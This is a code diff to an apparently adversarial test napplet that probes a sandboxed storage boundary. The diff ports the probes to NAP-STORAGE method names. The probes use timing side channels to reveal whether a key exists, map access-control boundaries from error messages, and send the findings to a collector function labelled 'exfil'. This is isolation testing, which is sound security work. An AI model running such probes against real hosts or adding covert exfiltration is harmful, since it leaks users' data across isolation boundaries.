@@ -419,12 +419,23 @@
 // against side channels; this napplet measures what leaks anyway through the
 // shell-mediated boundary: storage key existence by latency, quota, the
 // error taxonomy (which maps ACL boundaries), and signer backend behavior.
+
+// NAP-STORAGE (napplet/naps#3) names the injected methods getItem/setItem/
+// removeItem/keys (getItem → null on a miss). A shell exposing only the
+// pre-spec get/set/remove gets an explicit na naming that shape instead of a
+// TypeError mid-probe; the wire (storage.get/.set/.remove/.keys) is unchanged.
+function preSpecStorage(st) {
+  if (typeof st.getItem === 'function') return null;
+  const legacy = ['get', 'set', 'remove'].filter((k) => typeof st[k] === 'function');
+  return 'storage domain is not NAP-STORAGE shaped (no getItem' + (legacy.length ? '; pre-spec ' + legacy.join('/') + ' only' : '') + ') — probe not run';
+}
+
 async function timeKey(key, samples) {
   const st = window.napplet && window.napplet.storage;
   const times = [];
   for (let i = 0; i < samples; i++) {
     const t = performance.now();
-    try { await st.get(key); } catch (_) { /* timed either way */ }
+    try { await st.getItem(key); } catch (_) { /* timed either way */ }
     times.push(performance.now() - t);
   }
   return times.sort((a, b) => a - b)[Math.floor(times.length / 2)];
@@ -441,6 +452,8 @@ const ATTACKS = [
     async demo() {
       const st = window.napplet && window.napplet.storage;
       if (!st) return na('no injected storage domain — no mediation to time');
+      const gap = preSpecStorage(st);
+      if (gap) return na(gap);
       const hit = await timeKey('__evil06_seeded__', 12);
       const miss = await timeKey('__evil06_missing__' + randId(), 12);
       const delta = hit - miss;
@@ -452,6 +465,7 @@ const ATTACKS = [
       const st = window.napplet && window.napplet.storage;
       const out = {};
       if (!st) { out.error = 'no injected storage domain'; return out; }
+      if (preSpecStorage(st)) { out.error = preSpecStorage(st); return out; }
       out.hit = Math.round(await timeKey('__evil06_seeded__', 40));
       out.miss = Math.round(await timeKey('__evil06_missing__' + randId(), 40));
       out.oracle = out.hit - out.miss > 8 ? 'key existence readable (Δ' + (out.hit - out.miss) + 'ms)' : 'not separable';
@@ -493,17 +507,22 @@ const ATTACKS = [
     async demo() {
       const st = window.napplet && window.napplet.storage;
       if (!st) return na('no injected storage domain — no error surface to classify');
+      const gap = preSpecStorage(st);
+      if (gap) return na(gap);
       const errors = [];
       const kinds = new Set();
-      try { await st.get('__evil06_missing__' + randId()); } catch (e) { errors.push('get-missing: ' + errMsg(e)); kinds.add('get-missing'); }
+      try {
+        const v = await st.getItem('__evil06_missing__' + randId());
+        errors.push('get-missing: resolved ' + JSON.stringify(v)); kinds.add(v === null ? 'get-missing-null' : 'get-missing-value');
+      } catch (e) { errors.push('get-missing: ' + errMsg(e)); kinds.add('get-missing'); }
       try {
         const big = 'x'.repeat(600 * 1024);
-        await st.set('__evil06_big__', big);
-        await st.remove('__evil06_big__');
+        await st.setItem('__evil06_big__', big);
+        await st.removeItem('__evil06_big__');
       } catch (e) { errors.push('set-oversized: ' + errMsg(e)); kinds.add('set-oversized'); }
       try {
-        await st.set('__evil06_probe__', '1');
-        await st.remove('__evil06_probe__');
+        await st.setItem('__evil06_probe__', '1');
+        await st.removeItem('__evil06_probe__');
         kinds.add('set-ok');
         errors.push('set-ok: allowed');
       } catch (e) { errors.push('set-ok-threw: ' + errMsg(e)); kinds.add('set-denied'); }
@@ -515,9 +534,10 @@ const ATTACKS = [
       const st = window.napplet && window.napplet.storage;
       const out = { errors: [] };
       if (!st) { out.error = 'no injected storage domain'; return out; }
-      try { await st.get('__evil06_missing__' + randId()); } catch (e) { out.errors.push('get-missing: ' + errMsg(e)); }
-      try { await st.set('__evil06_big__', 'x'.repeat(600 * 1024)); } catch (e) { out.errors.push('set-oversized: ' + errMsg(e)); }
-      try { await st.set('__evil06_probe__', '1'); await st.remove('__evil06_probe__'); } catch (e) { out.errors.push('set: ' + errMsg(e)); }
+      if (preSpecStorage(st)) { out.error = preSpecStorage(st); return out; }
+      try { out.errors.push('get-missing: resolved ' + JSON.stringify(await st.getItem('__evil06_missing__' + randId()))); } catch (e) { out.errors.push('get-missing: ' + errMsg(e)); }
+      try { await st.setItem('__evil06_big__', 'x'.repeat(600 * 1024)); } catch (e) { out.errors.push('set-oversized: ' + errMsg(e)); }
+      try { await st.setItem('__evil06_probe__', '1'); await st.removeItem('__evil06_probe__'); } catch (e) { out.errors.push('set: ' + errMsg(e)); }
       out.exfil = await sendToCollector('error-taxonomy', out.errors);
       return out;
     },
